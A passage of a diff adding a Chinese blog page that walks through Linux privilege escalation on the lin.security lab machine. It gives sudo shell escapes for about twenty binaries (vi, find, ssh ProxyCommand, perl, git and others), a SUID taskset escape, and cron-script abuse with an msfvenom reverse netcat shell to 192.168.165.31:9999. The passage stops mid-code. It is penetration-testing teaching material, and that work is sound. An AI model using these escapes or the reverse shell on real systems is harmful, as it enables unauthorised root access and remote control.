+		class="gallery-image" 
+		data-flex-grow="437"
+		data-flex-basis="1050px"
+	
+></p>
+<h3 id="25dash提权">2.5.dash提权
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">sudo</span><span class="w"> </span><span class="n">dash</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/8.png"
+	width="848"
+	height="219"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/8_hu_af993a9d1d3e7d4a.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/8_hu_7d572bf69d954f79.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="387"
+		data-flex-basis="929px"
+	
+></p>
+<h3 id="26ed提权">2.6.ed提权
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">sudo</span><span class="w"> </span><span class="n">ed</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">!/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/9.png"
+	width="1084"
+	height="222"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/9_hu_90d79c9db2b9da41.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/9_hu_35377cb053d2bfe.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="488"
+		data-flex-basis="1171px"
+	
+></p>
+<h3 id="27env提权">2.7.env提权
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">sudo</span><span class="w"> </span><span class="n">env</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/10.png"
+	width="983"
+	height="249"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/10_hu_7a69b161c0238221.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/10_hu_b1fbf6fda6db3fe4.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="394"
+		data-flex-basis="947px"
+	
+></p>
+<h3 id="28expect提权">2.8.expect提权
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">sudo</span><span class="w"> </span><span class="n">expect</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="err">&#39;</span><span class="n">spawn</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="p">;</span><span class="n">interact</span><span class="err">&#39;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/11.png"
+	width="1016"
+	height="227"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/11_hu_e050b3ea5c46a3f7.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/11_hu_77cc81fba6b1fc0.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="447"
+		data-flex-basis="1074px"
+	
+></p>
+<h3 id="29find提权">2.9.find提权
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">sudo</span><span class="w"> </span><span class="n">find</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="o">-</span><span class="n">exec</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="w"> </span><span class="err">\</span><span class="p">;</span><span class="w"> </span><span class="o">-</span><span class="n">quit</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/12.png"
+	width="1138"
+	height="192"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/12_hu_8fa65cca6e70f962.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/12_hu_3133b592429607d8.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="592"
+		data-flex-basis="1422px"
+	
+></p>
+<h3 id="210ftp提权">2.10.ftp提权
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">sudo</span><span class="w"> </span><span class="n">ftp</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">!/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/13.png"
+	width="1033"
+	height="333"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/13_hu_8a653ad6e2569047.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/13_hu_f4a015ff4669e376.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="310"
+		data-flex-basis="744px"
+	
+></p>
+<h3 id="211lessmore提权">2.11.less/more提权
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">sudo</span><span class="w"> </span><span class="n">less</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">profile</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">!/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">TERM</span><span class="o">=</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="n">more</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">profile</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">!/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/14.png"
+	width="1026"
+	height="270"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/14_hu_d44300db973d083.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/14_hu_1d57bc790f79183d.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="380"
+		data-flex-basis="912px"
+	
+></p>
+<h3 id="212man提权">2.12.man提权
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">sudo</span><span class="w"> </span><span class="n">man</span><span class="w"> </span><span class="n">man</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/15.png"
+	width="1006"
+	height="338"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/15_hu_20879cb45cf2b272.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/15_hu_d7c5fab525531e51.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="297"
+		data-flex-basis="714px"
+	
+></p>
+<h3 id="213scp提权">2.13.SCP提权
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">bob</span><span class="nd">@linsecurity</span><span class="p">:</span><span class="o">~</span><span class="n">$</span><span class="w"> </span><span class="n">TF</span><span class="o">=</span><span class="n">$</span><span class="p">(</span><span class="n">mktemp</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">bob</span><span class="nd">@linsecurity</span><span class="p">:</span><span class="o">~</span><span class="n">$</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="err">&#39;</span><span class="n">sh</span><span class="w"> </span><span class="n">0</span><span class="o">&lt;&amp;</span><span class="n">2</span><span class="w"> </span><span class="n">1</span><span class="o">&gt;&amp;</span><span class="n">2</span><span class="err">&#39;</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">$TF</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">bob</span><span class="nd">@linsecurity</span><span class="p">:</span><span class="o">~</span><span class="n">$</span><span class="w"> </span><span class="n">chmod</span><span class="w"> </span><span class="o">+</span><span class="n">x</span><span class="w"> </span><span class="s">&#34;$TF&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">bob</span><span class="nd">@linsecurity</span><span class="p">:</span><span class="o">~</span><span class="n">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="n">scp</span><span class="w"> </span><span class="o">-</span><span class="n">S</span><span class="w"> </span><span class="n">$TF</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="n">y</span><span class="p">:</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/16.png"
+	width="1301"
+	height="393"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/16_hu_ed2bb8b912f89330.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/16_hu_55bc5dfd7b9ca9e0.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="331"
+		data-flex-basis="794px"
+	
+></p>
+<h3 id="214socat提权">2.14.socat提权
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">sudo</span><span class="w"> </span><span class="n">socat</span><span class="w"> </span><span class="n">stdin</span><span class="w"> </span><span class="n">exec</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/17.png"
+	width="1192"
+	height="339"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/17_hu_4ba3b6b6e1bcd2c6.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/17_hu_3f6a2e88ae8d357a.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="351"
+		data-flex-basis="843px"
+	
+></p>
+<h3 id="215ssh权限提升">2.15.ssh权限提升
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">sudo</span><span class="w"> </span><span class="n">ssh</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">ProxyCommand</span><span class="o">=</span><span class="err">&#39;</span><span class="p">;</span><span class="n">sh</span><span class="w"> </span><span class="n">0</span><span class="o">&lt;&amp;</span><span class="n">2</span><span class="w"> </span><span class="n">1</span><span class="o">&gt;&amp;</span><span class="n">2</span><span class="err">&#39;</span><span class="w"> </span><span class="n">x</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/18.png"
+	width="1350"
+	height="284"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/18_hu_9c4d6e95233f4381.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/18_hu_cc87cf43a66082a0.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="475"
+		data-flex-basis="1140px"
+	
+></p>
+<h3 id="216vi权限提升">2.16.vi权限提升
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">sudo</span><span class="w"> </span><span class="n">vi</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="err">&#39;</span><span class="p">:</span><span class="o">!/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="err">&#39;</span><span class="w"> </span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="kc">null</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/19.png"
+	width="1247"
+	height="379"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/19_hu_7dbaab3eac71d783.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/19_hu_a3489aee7a8f0576.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="329"
+		data-flex-basis="789px"
+	
+></p>
+<h3 id="217zsh权限提升">2.17.zsh权限提升
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">sudo</span><span class="w"> </span><span class="n">zsh</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/20.png"
+	width="1153"
+	height="262"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/20_hu_d767c19c9b62a49e.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/20_hu_8cb4410a5c58c40f.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="440"
+		data-flex-basis="1056px"
+	
+></p>
+<h3 id="218perl提权">2.18.perl提权
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">sudo</span><span class="w"> </span><span class="n">perl</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="err">&#39;</span><span class="n">exec</span><span class="w"> </span><span class="s">&#34;/bin/sh&#34;</span><span class="p">;</span><span class="err">&#39;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/21.png"
+	width="1195"
+	height="349"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/21_hu_122ab852cd63babc.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/21_hu_f0315d073e679b2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="342"
+		data-flex-basis="821px"
+	
+></p>
+<h3 id="219tclsh提权">2.19.<font style="color:rgb(79, 79, 79);">tclsh提权</font>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="w"> </span><span class="n">使用命令</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="n">tclsh</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">exec</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="w"> </span><span class="o">&lt;</span><span class="nd">@stdin</span><span class="w"> </span><span class="o">&gt;</span><span class="nd">@stdout</span><span class="w"> </span><span class="n">2</span><span class="o">&gt;</span><span class="nd">@stderr</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/22.png"
+	width="1250"
+	height="414"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/22_hu_af7ea549058ef084.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/22_hu_ecc5842b788aca74.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="301"
+		data-flex-basis="724px"
+	
+></p>
+<h3 id="220git提权">2.20.git提权
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="w"> </span><span class="n">使用命令</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="n">git</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">help</span><span class="w"> </span><span class="n">config</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="o">!/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/23.png"
+	width="1336"
+	height="330"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/23_hu_2673f72f318f21ee.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/23_hu_942444d07f48364a.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="404"
+		data-flex-basis="971px"
+	
+></p>
+<h3 id="221script提权">2.21.script提权
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="w"> </span><span class="n">使用命令</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="o">-</span><span class="n">q</span><span class="w"> </span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="kc">null</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/24.png"
+	width="1338"
+	height="362"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/24_hu_bb28bce7668c4c06.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/24_hu_4b7e0f3ca395822c.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="369"
+		data-flex-basis="887px"
+	
+></p>
+<h2 id="3suid提权">3.SUID提权
+</h2><p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/25.png"
+	width="1594"
+	height="902"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/25_hu_f6c4d5830153f1b3.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/25_hu_2fdbeb1eddadc283.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="176"
+		data-flex-basis="424px"
+	
+></p>
+<h3 id="31taskset提权">3.1.taskset提权
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">taskset</span><span class="w"> </span><span class="n">1</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/26.png"
+	width="1521"
+	height="253"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/26_hu_758f6ac89a25f3aa.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/26_hu_9ba8fe9590265353.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="601"
+		data-flex-basis="1442px"
+	
+></p>
+<h2 id="4计划任务提权">4.计划任务提权
+</h2><p><strong>原理：****<font style="color:#DF2A3F;">提权的原理为计划任务以</font></strong><a class="link" href="https://zhida.zhihu.com/search?content_id=221073054&amp;content_type=Article&amp;match_order=1&amp;q=root%E6%9D%83%E9%99%90&amp;zhida_source=entity"  target="_blank" rel="noopener"
+    ><strong><font style="color:#DF2A3F;">root权限</font></strong></a><strong><font style="color:#DF2A3F;">运行，计划任务中的脚本其他用户有写入的权限，或者脚本所属组为其他用户，则可以进行计划任务提权。</font></strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">crontab</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w">          </span><span class="c1">//查看当前用户的计划任务</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">crontab</span><span class="w">    </span><span class="c1">//查看服务器所有用户的计划任务</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/27.png"
+	width="1887"
+	height="864"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/27_hu_6f9138ef600a087e.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/27_hu_14b110823a77274a.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="218"
+		data-flex-basis="524px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//每分钟以root权限执行/etc/cron.daily目录下的backup脚本</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">*/</span><span class="n">1</span><span class="w"> </span><span class="o">*</span><span class="w">   </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w">   </span><span class="n">root</span><span class="w">    </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="p">.</span><span class="na">daily</span><span class="o">/</span><span class="n">backup</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>如果当前低权限用户有权限修改这个backup脚本，那么就可以写个反弹shell命令，计划任务每分钟就会以root权限反弹shell到本机实现权限提升</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">msfvenom</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">cmd</span><span class="o">/</span><span class="n">unix</span><span class="o">/</span><span class="n">reverse_netcat</span><span class="w"> </span><span class="n">lhost</span><span class="o">=</span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">165</span><span class="p">.</span><span class="na">31</span><span class="w"> </span><span class="n">lport</span><span class="o">=</span><span class="n">9999</span><span class="w"> </span><span class="n">R</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/28.png"
+	width="1591"
+	height="381"
+	srcset="/p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/28_hu_e29e694186cb1895.png 480w, /p/linux%E6%8F%90%E6%9D%83%E9%9D%B6%E6%9C%BAlin.security/28_hu_610b15a5795c86fa.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="417"
+		data-flex-basis="1002px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">#</span><span class="w"> </span><span class="n">使用命令</span><span class="w">
